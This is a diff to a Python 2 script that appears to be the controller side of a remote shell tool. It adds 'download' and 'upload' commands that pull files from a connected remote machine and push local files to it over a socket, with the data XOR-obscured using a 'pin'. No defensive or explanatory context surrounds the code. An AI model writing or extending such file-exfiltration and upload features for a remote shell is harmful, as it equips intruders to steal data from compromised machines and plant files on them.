@@ -43,7 +43,26 @@ while True:
         print("[!] Shutting down shell!")
         conn.close()
         sys.exit(0)
-
+    elif msg.startswith('download'):
+        getname = msg.split(" ")
+        rem_file = getname[1]
+        filename = rem_file.replace("/","-")
+        data = conn.recv(socksize)
+        filedata = xor(data, pin)
+        newfile = file(filename, "wb")
+        newfile.write(filedata)
+        newfile.close()
+        if os.path.exists(filename) is True:
+            print("[+] Download complete.")
+            print("[+] File location: " + os.getcwd()+"/"+filename)
+    elif msg.startswith('upload'):
+	getname = msg.split(" ")
+        loc_file = getname[1]
+        sendfile = open(loc_file, "r")
+        filedata = sendfile.read()
+        sendfile.close()
+        senddata = xor(filedata, pin)
+        conn.sendall(senddata)
 
 conn.close()
 
